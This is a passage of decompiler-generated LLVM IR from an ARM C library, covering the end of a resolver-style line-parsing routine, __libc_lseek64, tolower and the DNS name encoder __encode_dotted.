  %v3_17110 = mul nuw nsw i32 %v1_17110, 2
  %v4_17110 = add i32 %v3_17110, %v2_1710c.pre
  %v5_17110 = inttoptr i32 %v4_17110 to i8*
  %v6_17110 = load i8, i8* %v5_17110, align 1
  %v8_17110 = zext i8 %v6_17110 to i32
  store i32 %v8_17110, i32* %r3.global-to-local, align 4
  %v1_17114 = and i32 %v8_17110, 32
  %v2_17114 = icmp eq i32 %v1_17114, 0
  br i1 %v2_17114, label %dec_label_pc_170f8, label %dec_label_pc_1711c.loopexit

dec_label_pc_1711c.loopexit:                      ; preds = %dec_label_pc_17108, %dec_label_pc_170f8, %dec_label_pc_170fc.preheader
  %v0_1711c = phi i32 [ %v0_170fc25, %dec_label_pc_170fc.preheader ], [ %v0_170f8, %dec_label_pc_17108 ], [ %v1_170f8, %dec_label_pc_170f8 ]
  %v1_1711c = inttoptr i32 %v0_1711c to i8*
  %v2_1711c = load i8, i8* %v1_1711c, align 1
  %v3_1711c = zext i8 %v2_1711c to i32
  store i32 %v3_1711c, i32* %r3.global-to-local, align 4
  %v2_17120 = icmp eq i8 %v2_1711c, 0
  br i1 %v2_17120, label %dec_label_pc_17128, label %dec_label_pc_170c8.preheader

dec_label_pc_170c8.preheader:                     ; preds = %dec_label_pc_1711c.preheader, %dec_label_pc_1711c.loopexit
  %v0_170c820 = phi i32 [ %v0_1711c, %dec_label_pc_1711c.loopexit ], [ %v0_1711c30, %dec_label_pc_1711c.preheader ]
  %v1_170c821 = inttoptr i32 %v0_170c820 to i8*
  %v2_170c822 = load i8, i8* %v1_170c821, align 1
  %v3_170c823 = zext i8 %v2_170c822 to i32
  store i32 %v3_170c823, i32* %r1.global-to-local, align 4
  %v2_170cc24 = icmp eq i8 %v2_170c822, 0
  br i1 %v2_170cc24, label %dec_label_pc_17128, label %dec_label_pc_170d4

dec_label_pc_17128:                               ; preds = %dec_label_pc_1711c.loopexit, %dec_label_pc_170c8.preheader, %dec_label_pc_170c0, %dec_label_pc_1711c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1712c = load i32, i32* @r6, align 4
  %v1_17130 = load i32, i32* @r4, align 4
  %v5_17130 = mul i32 %v0_1712c, 4
  %v6_17130 = add i32 %v1_17130, %v5_17130
  %v7_17130 = inttoptr i32 %v6_17130 to i32*
  store i32 0, i32* %v7_17130, align 4
  %v7_17134 = icmp sgt i32 %v0_1712c, 1
  br i1 %v7_17134, label %dec_label_pc_17138, label %dec_label_pc_171dc

dec_label_pc_17138:                               ; preds = %dec_label_pc_17128
  %v2_17138 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17138, i32* %r0.global-to-local, align 4
  %v7_1713c = icmp eq i32 %v2_17138, 1
  br i1 %v7_1713c, label %dec_label_pc_17210, label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %dec_label_pc_17138
  %v7_17144 = icmp eq i32 %v2_17138, 2
  br i1 %v7_17144, label %dec_label_pc_17150, label %dec_label_pc_1717c.preheader

dec_label_pc_1717c.preheader:                     ; preds = %dec_label_pc_17144
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1717c

dec_label_pc_17150:                               ; preds = %dec_label_pc_17144
  store i32 %v0_16f14, i32* %r0.global-to-local, align 4
  %v0_17154 = load i32, i32* @r4, align 4
  %v1_17154 = inttoptr i32 %v0_17154 to i32*
  %v2_17154 = load i32, i32* %v1_17154, align 4
  store i32 %v2_17154, i32* @r1, align 4
  %v3_17158 = call i32 @__GI_strcoll(i8* %v2_17158, i32 %v2_17154)
  store i32 %v3_17158, i32* %r0.global-to-local, align 4
  %v2_1715c = icmp eq i32 %v3_17158, 0
  br i1 %v2_1715c, label %dec_label_pc_1718c, label %dec_label_pc_171dc

dec_label_pc_17168:                               ; preds = %dec_label_pc_1717c
  %v0_17168 = load i32, i32* @r4, align 4
  %v4_17168 = mul i32 %v1_17168, 4
  %v5_17168 = add i32 %v0_17168, %v4_17168
  %v6_17168 = inttoptr i32 %v5_17168 to i32*
  %v7_17168 = load i32, i32* %v6_17168, align 4
  store i32 %v7_17168, i32* %r1.global-to-local, align 4
  %v3_1716c = call i32 @__GI_strcasecmp(i8* %v2_17158, i32 %v7_17168)
  store i32 %v3_1716c, i32* %r0.global-to-local, align 4
  %v2_17170 = icmp eq i32 %v3_1716c, 0
  %v0_17174 = load i32, i32* @r5, align 4
  %v1_17174 = add i32 %v0_17174, 1
  store i32 %v1_17174, i32* @r5, align 4
  br i1 %v2_17170, label %dec_label_pc_1718c, label %dec_label_pc_1717c

dec_label_pc_1717c:                               ; preds = %dec_label_pc_1717c.preheader, %dec_label_pc_17168
  %v1_17168 = phi i32 [ 1, %dec_label_pc_1717c.preheader ], [ %v1_17174, %dec_label_pc_17168 ]
  %v1_1717c = load i32, i32* @r6, align 4
  store i32 %v0_16f14, i32* %r0.global-to-local, align 4
  %v5_17184 = icmp slt i32 %v1_17168, %v1_1717c
  br i1 %v5_17184, label %dec_label_pc_17168, label %dec_label_pc_171dc

dec_label_pc_1718c:                               ; preds = %dec_label_pc_17168, %dec_label_pc_17150
  store i32 %v0_16f0c, i32* %r1.global-to-local, align 4
  br i1 %v7_17190, label %dec_label_pc_17198, label %dec_label_pc_171b4

dec_label_pc_17198:                               ; preds = %dec_label_pc_1718c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1719c = load i32, i32* @r7, align 4
  store i32 %v0_1719c, i32* %r2.global-to-local, align 4
  %v0_171a0 = load i32, i32* @r4, align 4
  %v1_171a0 = inttoptr i32 %v0_171a0 to i32*
  %v2_171a0 = load i32, i32* %v1_171a0, align 4
  store i32 %v2_171a0, i32* %r1.global-to-local, align 4
  %v3_171a4 = inttoptr i32 %v2_171a0 to i8*
  %v4_171a4 = call i32 @inet_pton(i32 2, i8* %v3_171a4, i32 %v0_1719c)
  store i32 %v4_171a4, i32* %r0.global-to-local, align 4
  %v5_171ac = icmp sgt i32 %v4_171a4, 0
  br i1 %v5_171ac, label %dec_label_pc_16fe8, label %dec_label_pc_171d8

dec_label_pc_171b4:                               ; preds = %dec_label_pc_1718c
  store i32 %v0_16f0c, i32* %r2.global-to-local, align 4
  br i1 %v7_171b8, label %dec_label_pc_171c0, label %dec_label_pc_171d8

dec_label_pc_171c0:                               ; preds = %dec_label_pc_171b4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_171c4 = load i32, i32* @r4, align 4
  %v1_171c4 = inttoptr i32 %v0_171c4 to i32*
  %v2_171c4 = load i32, i32* %v1_171c4, align 4
  store i32 %v2_171c4, i32* %r1.global-to-local, align 4
  store i32 %v0_17090, i32* %r2.global-to-local, align 4
  %v3_171cc = inttoptr i32 %v2_171c4 to i8*
  %v4_171cc = call i32 @inet_pton(i32 10, i8* %v3_171cc, i32 %v0_17090)
  store i32 %v4_171cc, i32* %r0.global-to-local, align 4
  %v5_171d4 = icmp sgt i32 %v4_171cc, 0
  br i1 %v5_171d4, label %dec_label_pc_1702c, label %dec_label_pc_171d8

dec_label_pc_171d8:                               ; preds = %dec_label_pc_17198, %dec_label_pc_171b4, %dec_label_pc_171c0
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_171dc

dec_label_pc_171dc:                               ; preds = %dec_label_pc_1717c, %dec_label_pc_17150, %dec_label_pc_17128, %dec_label_pc_171d8, %dec_label_pc_17084
  %v0_171dc = load i32, i32* @fp, align 4
  store i32 %v0_171dc, i32* %r0.global-to-local, align 4
  %v0_171e0 = load i32, i32* @r8, align 4
  store i32 %v0_171e0, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_171e8 = call i32 @fgets(i32 %v0_171dc, i32 %v0_171e0, i32 %stack_var_-52.0)
  store i32 %v3_171e8, i32* %r0.global-to-local, align 4
  %v2_171ec = icmp eq i32 %v3_171e8, 0
  br i1 %v2_171ec, label %dec_label_pc_171f4, label %dec_label_pc_1709c

dec_label_pc_171f4:                               ; preds = %dec_label_pc_171dc, %dec_label_pc_1702c, %dec_label_pc_16fe8
  %v2_171f4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_171f4, i32* %r3.global-to-local, align 4
  %v7_171f8 = icmp eq i32 %v2_171f4, 1
  br i1 %v7_171f8, label %dec_label_pc_17210, label %dec_label_pc_17200

dec_label_pc_17200:                               ; preds = %dec_label_pc_171f4
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_17204 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_17204 = call i32 @__GI_fclose(i8* %v1_17204)
  store i32 %v2_17204, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17210

dec_label_pc_1720c:                               ; preds = %dec_label_pc_16f28, %bb74, %dec_label_pc_16f7c, %dec_label_pc_16f74, %dec_label_pc_16f68, %dec_label_pc_16f54, %dec_label_pc_16f38
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %dec_label_pc_17138, %dec_label_pc_171f4, %dec_label_pc_17200, %dec_label_pc_16fd0, %dec_label_pc_1720c
  %v0_17210 = load i32, i32* @sl, align 4
  store i32 %v0_17210, i32* %r0.global-to-local, align 4
  store i32 %v3_16ef8, i32* @r4, align 4
  store i32 %v6_16ef8, i32* @r5, align 4
  store i32 %v12_16ef8, i32* @r7, align 4
  store i32 %v15_16ef8, i32* @r8, align 4
  store i32 %v21_16ef8, i32* @sl, align 4
  store i32 %v24_16ef8, i32* @fp, align 4
  ret i32 %v0_17210

; uselistorder directives
  uselistorder i32 %v1_17168, { 1, 0 }
  uselistorder i32 %v0_1712c, { 1, 0 }
  uselistorder i32 %v3_170c823, { 1, 0 }
  uselistorder i32 %v0_170c820, { 1, 0 }
  uselistorder i32 %v2_170a4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_16fa4, { 1, 0 }
  uselistorder i32 %v0_16f68, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16f4c, { 1, 0 }
  uselistorder i32 %v0_16f18, { 1, 0, 2 }
  uselistorder i32 %v0_16f0c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16f08, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 13, 11, 14, 12, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 7, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 8, 9, 10, 11, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 6, 2, 3, 0, 7, 8, 5, 1, 4 }
  uselistorder i32 (i8*)* @__GI_fclose, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 0, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 20, 14, 15, 16, 0, 1, 17, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 7, { 2, 21, 22, 11, 12, 13, 0, 17, 24, 20, 1, 3, 4, 5, 18, 19, 8, 14, 15, 6, 7, 16, 10, 9, 23 }
  uselistorder i32* @global_var_231b0, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 35, 16, 36, 17, 18, 19, 0, 31, 32, 20, 27, 28, 37, 9, 21, 13, 33, 34, 11, 10, 2, 49, 22, 8, 24, 25, 23, 26, 50 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 19, 17, 14, 1, 0, 16, 8, 9, 4 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 4, 1, 14, 0, 8, 9, 10, 2, 3, 5, 6, 7 }
  uselistorder i32 56, { 4, 3, 6, 2, 7, 1, 0, 8, 5 }
  uselistorder i32 44, { 9, 10, 11, 7, 8, 15, 1, 6, 14, 13, 0, 12, 2, 3, 4, 5 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32* @fp, { 36, 39, 37, 1, 38, 40, 41, 42, 43, 0, 45, 44, 46, 47, 48, 2, 49, 50, 51, 52, 53, 54, 55, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 30, 31, 32, 33, 34, 35, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 106, 107, 105, 100, 101, 102, 103, 104 }
  uselistorder i32* @sl, { 21, 22, 23, 24, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 2, 3, 35, 36, 0, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* @r7, { 64, 66, 67, 65, 68, 69, 70, 71, 72, 73, 9, 10, 11, 12, 13, 14, 15, 1, 74, 82, 81, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 43, 44, 115, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 45, 46, 47, 48, 28, 29, 30, 31, 83, 3, 84, 85, 4, 5, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0, 7, 8, 113, 114, 60, 61, 62, 63, 75, 76, 77, 78, 79, 80, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder label %dec_label_pc_17210, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1720c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_171dc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_171d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1717c, { 1, 0 }
  uselistorder label %dec_label_pc_17128, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_170c8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_17108, { 1, 0 }
  uselistorder label %dec_label_pc_17084, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_16f38, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17264, label %dec_label_pc_17250

dec_label_pc_17250:                               ; preds = %entry
  %v0_17250 = call i32 @__errno_location()
  %v0_17254 = load i32, i32* %r4.global-to-local, align 4
  %v1_17254 = sub i32 0, %v0_17254
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1725c = inttoptr i32 %v0_17250 to i32*
  store i32 %v1_17254, i32* %v2_1725c, align 4
  %v0_1726c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1726c

dec_label_pc_17264:                               ; preds = %entry
  %v2_17264 = icmp eq i32 %arg1, 0
  br i1 %v2_17264, label %dec_label_pc_17278, label %dec_label_pc_1726c

dec_label_pc_1726c:                               ; preds = %dec_label_pc_17264, %dec_label_pc_17250
  %v0_1726c = phi i32 [ %arg1, %dec_label_pc_17264 ], [ %v0_1726c.pre, %dec_label_pc_17250 ]
  br label %dec_label_pc_1727c

dec_label_pc_17278:                               ; preds = %dec_label_pc_17264
  br label %dec_label_pc_1727c

dec_label_pc_1727c:                               ; preds = %dec_label_pc_1726c, %dec_label_pc_17278
  %v14_17280 = phi i32 [ %v0_1726c, %dec_label_pc_1726c ], [ %tmp9, %dec_label_pc_17278 ]
  ret i32 %v14_17280

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 52, 16, 71, 70, 69, 43, 42, 51, 50, 41, 18, 38, 49, 48, 27, 54, 13, 12, 11, 10, 24, 9, 23, 73, 65, 64, 56, 55, 68, 67, 66, 17, 63, 26, 37, 36, 53, 1, 30, 33, 57, 32, 35, 47, 46, 45, 2, 40, 39, 0, 44, 8, 7, 62, 29, 28, 61, 22, 6, 15, 3, 21, 14, 60, 59, 34, 20, 19, 58, 5, 4, 72, 31, 25 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1727c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1728c = icmp slt i32 %arg1, 0
  br i1 %v1_1728c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1728c = mul i32 %arg1, 2
  %v2_17298 = load i32, i32* bitcast (i32** @global_var_234ec.418 to i32*), align 4
  %v2_1729c = add i32 %v2_17298, %v2_1728c
  %v3_172a0 = inttoptr i32 %v2_1729c to i8*
  %v4_172a0 = load i8, i8* %v3_172a0, align 1
  %v6_172a0 = zext i8 %v4_172a0 to i32
  %v1_172a4 = add i32 %v2_1729c, 1
  %v2_172a4 = inttoptr i32 %v1_172a4 to i8*
  %v3_172a4 = load i8, i8* %v2_172a4, align 1
  %v4_172a4 = zext i8 %v3_172a4 to i32
  %v3_172a8 = mul nuw i32 %v4_172a4, 16777216
  %v4_172ac = sdiv i32 %v3_172a8, 65536
  %v5_172ac = or i32 %v4_172ac, %v6_172a0
  ret i32 %v5_172ac

; uselistorder directives
  uselistorder i32 %v2_1729c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_172b8 = load i32, i32* @r4, align 4
  store i32 %v3_172b8, i32* %stack_var_-24, align 4
  %v6_172b8 = load i32, i32* @r5, align 4
  %v9_172b8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_172c0 = load i32, i32* @r1, align 4
  store i32 %v0_172c0, i32* @r6, align 4
  %v0_172c4 = load i32, i32* @r2, align 4
  store i32 %v0_172c4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1732c19 = icmp slt i8* %arg1, null
  store i1 %v1_1732c19, i1* %cpsr_n.global-to-local, align 1
  %v2_1732c20 = icmp eq i8* %arg1, null
  store i1 %v2_1732c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1732c20, label %dec_label_pc_17344, label %dec_label_pc_17338

dec_label_pc_172d0:                               ; preds = %dec_label_pc_17338
  %v2_172d0 = call i32 @__GI_strchr(i32 %v0_172d021, i32 46)
  store i32 %v2_172d0, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172d4 = icmp slt i32 %v2_172d0, 0
  store i1 %v1_172d4, i1* %cpsr_n.global-to-local, align 1
  %v2_172d4 = icmp eq i32 %v2_172d0, 0
  store i1 %v2_172d4, i1* %cpsr_z.global-to-local, align 1
  %v0_172d8 = load i32, i32* @r4, align 4
  %v2_172d8 = sub i32 %v2_172d0, %v0_172d8
  store i32 %v2_172d8, i32* %ip.global-to-local, align 4
  store i32 %v0_172d8, i32* %r0.global-to-local, align 4
  br i1 %v2_172d4, label %dec_label_pc_172e4, label %dec_label_pc_172ec

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172d0
  %v1_172dc = inttoptr i32 %v0_172d8 to i8*
  %v3_172e4 = call i32 @strlen(i8* %v1_172dc)
  store i32 %v3_172e4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_172e4, 16777216
  %v1_172e8 = sdiv i32 %sext, 16777216
  store i32 %v1_172e8, i32* %ip.global-to-local, align 4
  %v0_172f8.pre = load i32, i32* @r4, align 4
  %v0_17308.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_172ec

dec_label_pc_172ec:                               ; preds = %dec_label_pc_172d0, %dec_label_pc_172e4
  %v0_17308 = phi i32 [ %v2_172d0, %dec_label_pc_172d0 ], [ %v0_17308.pre, %dec_label_pc_172e4 ]
  %v0_172f8 = phi i32 [ %v0_172d8, %dec_label_pc_172d0 ], [ %v0_172f8.pre, %dec_label_pc_172e4 ]
  %v0_17318 = phi i32 [ %v2_172d8, %dec_label_pc_172d0 ], [ %v1_172e8, %dec_label_pc_172e4 ]
  %v0_172ec = load i32, i32* %r7.global-to-local, align 4
  %v1_172ec = add i32 %v0_172ec, 1
  store i32 %v1_172ec, i32* @lr, align 4
  %v1_172f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_172f0 = sub i32 %v1_172f0, %v0_172ec
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172f4 = icmp slt i32 %v0_17318, 0
  store i1 %v1_172f4, i1* %cpsr_n.global-to-local, align 1
  %v2_172f4 = icmp eq i32 %v0_17318, 0
  store i1 %v2_172f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_172f8, i32* @r1, align 4
  %v0_172fc = load i32, i32* @r6, align 4
  %v2_172fc = add i32 %v0_172fc, %v1_172ec
  store i32 %v2_172fc, i32* @r0, align 4
  store i32 %v0_17318, i32* @r2, align 4
  %v1_17304 = add i32 %v2_172f0, -1
  %v1_17308 = add i32 %v0_17308, 1
  store i32 %v1_17308, i32* @r4, align 4
  br i1 %v2_172f4, label %.loopexit, label %dec_label_pc_17310

dec_label_pc_17310:                               ; preds = %dec_label_pc_172ec
  %v2_17310 = sub i32 %v0_17318, %v1_17304
  %v3_17310 = icmp ult i32 %v0_17318, %v1_17304
  %v4_17310 = xor i32 %v1_17304, %v0_17318
  %v5_17310 = xor i32 %v2_17310, %v0_17318
  %v6_17310 = and i32 %v5_17310, %v4_17310
  %v7_17310 = icmp slt i32 %v6_17310, 0
  store i1 %v7_17310, i1* %cpsr_v.global-to-local, align 1
  %v8_17310 = icmp slt i32 %v2_17310, 0
  store i1 %v8_17310, i1* %cpsr_n.global-to-local, align 1
  %v9_17310 = icmp eq i32 %v0_17318, %v1_17304
  store i1 %v9_17310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17310, label %dec_label_pc_17318, label %.loopexit

dec_label_pc_17318:                               ; preds = %dec_label_pc_17310
  %v1_17318 = trunc i32 %v0_17318 to i8
  %v4_17318 = add i32 %v0_172fc, %v0_172ec
  %v5_17318 = inttoptr i32 %v4_17318 to i8*
  store i8 %v1_17318, i8* %v5_17318, align 1
  %v0_1731c = load i32, i32* @lr, align 4
  %v1_1731c = load i32, i32* %ip.global-to-local, align 4
  %v2_1731c = add i32 %v1_1731c, %v0_1731c
  store i32 %v2_1731c, i32* %r7.global-to-local, align 4
  %v0_17320 = call i32 @memcpy()
  store i32 %v0_17320, i32* %r0.global-to-local, align 4
  %v0_17324 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17324 = icmp slt i32 %v0_17324, 0
  store i1 %v1_17324, i1* %cpsr_n.global-to-local, align 1
  %v2_17324 = icmp eq i32 %v0_17324, 0
  store i1 %v2_17324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17324, label %dec_label_pc_17344, label %dec_label_pc_17318.dec_label_pc_1732c_crit_edge

dec_label_pc_17318.dec_label_pc_1732c_crit_edge:  ; preds = %dec_label_pc_17318
  %v0_1732c.pre = load i32, i32* @r4, align 4
  store i32 %v0_1732c.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1732c = icmp slt i32 %v0_1732c.pre, 0
  store i1 %v1_1732c, i1* %cpsr_n.global-to-local, align 1
  %v2_1732c = icmp eq i32 %v0_1732c.pre, 0
  store i1 %v2_1732c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1732c, label %dec_label_pc_17344, label %dec_label_pc_17338

dec_label_pc_17338:                               ; preds = %entry, %dec_label_pc_17318.dec_label_pc_1732c_crit_edge
  %v0_172d021 = phi i32 [ %v0_1732c.pre, %dec_label_pc_17318.dec_label_pc_1732c_crit_edge ], [ %tmp, %entry ]
  %v1_17338 = inttoptr i32 %v0_172d021 to i8*
  %v2_17338 = load i8, i8* %v1_17338, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1733c = icmp eq i8 %v2_17338, 0
  store i1 %v2_1733c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1733c, label %dec_label_pc_17344, label %dec_label_pc_172d0

dec_label_pc_17344:                               ; preds = %dec_label_pc_17318.dec_label_pc_1732c_crit_edge, %dec_label_pc_17318, %dec_label_pc_17338, %entry
  %v0_17344 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17344 = icmp slt i32 %v0_17344, 0
  store i1 %v1_17344, i1* %cpsr_n.global-to-local, align 1
  %v2_17344 = icmp eq i32 %v0_17344, 0
  store i1 %v2_17344, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_17344, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_17344
  %v5_1734c = load i32, i32* %r7.global-to-local, align 4
  %v6_1734c = add i32 %v5_1734c, 1
  store i32 %v6_1734c, i32* %r0.global-to-local, align 4
  %v7_17350 = load i32, i32* @r6, align 4
  %v9_17350 = add i32 %v7_17350, %v5_1734c
  %v10_17350 = inttoptr i32 %v9_17350 to i8*
  store i8 0, i8* %v10_17350, align 1
  %v0_17354.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_17354.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17354.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_17344, %bb
  %v2_17354 = phi i1 [ %v2_17354.pre, %bb ], [ false, %dec_label_pc_17344 ]
  %v1_17354 = phi i1 [ %v1_17354.pre, %bb ], [ %v1_17344, %dec_label_pc_17344 ]
  %v0_17354 = phi i1 [ %v0_17354.pre, %bb ], [ %v2_17344, %dec_label_pc_17344 ]
  %v3_17354 = xor i1 %v2_17354, %v1_17354
  %v4_17354 = or i1 %v0_17354, %v3_17354
  br i1 %v4_17354, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_17354 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_17354, i32* @r4, align 4
  store i32 %v6_172b8, i32* @r5, align 4
  store i32 %v9_172b8, i32* @r6, align 4
  %v25_17354 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_17354

.loopexit:                                        ; preds = %dec_label_pc_17310, %dec_label_pc_172ec, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1735c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1735c, i32* @r4, align 4
  store i32 %v6_172b8, i32* @r5, align 4
  store i32 %v9_172b8, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_17344, { 0, 2, 1 }
  uselistorder i32 %v0_1732c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17324, { 1, 0 }
  uselistorder i32 %v2_17310, { 1, 0 }
  uselistorder i32 %v1_17304, { 2, 0, 3, 1 }
  uselistorder i32 %v0_17318, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_172e8, { 1, 0 }
  uselistorder i32 %v0_172d8, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1732c20, { 1, 0 }
  uselistorder i32 %v9_172b8, { 1, 0 }
  uselistorder i32 %v6_172b8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
